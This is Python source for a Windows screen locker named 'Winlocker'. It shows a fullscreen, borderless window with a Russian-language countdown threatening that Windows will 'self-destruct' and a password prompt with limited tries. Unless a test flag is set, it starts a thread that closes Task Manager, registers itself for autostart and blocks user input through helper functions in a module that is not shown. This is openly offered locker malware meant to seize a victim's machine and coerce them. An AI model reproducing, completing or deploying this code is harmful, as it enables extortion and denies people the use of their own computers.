import customtkinter as ctk
import module as m
import time as t
import threading
import json
import os
import sys 

def resource_path(relative_path):
    try:
        if getattr(sys, 'frozen', False):
            base_path = sys._MEIPASS
        else:
            base_path = os.path.abspath(".")
        return os.path.join(base_path, relative_path)
    except Exception as e:
        print("Ошибка при получении пути:", e)
        return None

config_file_path = resource_path("config.json")

def read_info():
    try:
        if config_file_path:
            with open(config_file_path, 'r') as json_file:
                data = json.load(json_file)
                title = data.get("title")
                title_color = data.get("title_color")
                info = data.get("info")
                info_color = data.get("info_color")
                time = data.get("time")
                time_color = data.get("time_color")
                password = data.get("password")
                passw_color = data.get("passw_color")
                test_variant = data.get("test_variant")
                data = {
                    "title": title,
                    "title_color": title_color,
                    "info": info,
                    "info_color": info_color,
                    "time": time,
                    "time_color": time_color,
                    "password": password,
                    "passw_color": passw_color,
                    "test_variant": test_variant
                }
                return data
    except FileNotFoundError:
        print("Файл не найден.")

ctk.set_appearance_mode("system") 
ctk.set_default_color_theme("green")

app = ctk.CTk()
app.title("Winlocker")
app.attributes('-fullscreen', True)
app.overrideredirect(True)

data = read_info()
title_locker = data["title"]
title_color = data["title_color"]
info = data["info"]
info_color = data["info_color"]
time_str = data["time"]
time_int = int(time_str)
time_color = data["time_color"]
password = data["password"]
passw_color = data["passw_color"]
test_variant = data["test_variant"]

tryes = 6

def update_label(seconds):
    if seconds >= 0:
        time.configure(text=f"Времени до самоликвидации: {seconds // 3600:02}:{(seconds % 3600) // 60:02}:{seconds % 60:02}", text_color='green')
        app.after(1000, update_label, seconds - 1)
    else:
        time.configure(text="Время вышло!", text_color='red')

def check_pass():
    global tryes 
    entry_pass = entry.get()

    if entry_pass == password:
        time.configure(text='Ваш windows разблокирован', text_color='green')
        app.destroy()
    
    elif tryes == 0:
        try_label.configure(text=f'Windows самоликвидируеться...', text_color='red')

    else:
        tryes -= 1 
        try_label.configure(text=f'Количество попыток: {tryes}') 

title = ctk.CTkLabel(app, text=title_locker, text_color=title_color, font=("Bold", 100))
title.pack(pady=20)

more = ctk.CTkLabel(app, text=info, text_color=info_color, font=("Bold", 30))
more.pack(pady=30)

time = ctk.CTkLabel(app, text='', text_color=time_color, font=('Bold', 50))
time.pack(pady=60)

ent_pas = ctk.CTkLabel(app, text=f'Введите пароль', text_color='red', font=('Bold', 60))
ent_pas.pack(pady=20)

try_label = ctk.CTkLabel(app, text=f'Количество попыток: {tryes}', text_color='green', font=('Bold', 50))
try_label.pack(pady=20)

entry = ctk.CTkEntry(app, placeholder_text='Введите пароль для разблокировки',
                    placeholder_text_color=passw_color, text_color=passw_color, border_color='red',
                    width=650, height=65, font=('Bold', 30))
entry.pack(pady=30)

unblock = ctk.CTkButton(app, width=650, height=100, text='Разблокировать', text_color='green', 
                        font=('Bold', 40), hover=True, hover_color='blue', text_color_disabled='red',
                        fg_color='white', command=check_pass)
unblock.pack(pady=20)

if __name__ == "__main__":
    if test_variant == 0:
        taskmgr_thread = threading.Thread(target=m.close_taskmgr, daemon=True)#run close taskmngr in other thread
        taskmgr_thread.start()  
        m.add_autostart()
        m.block_input()

    update_label(time_int)
    app.mainloop()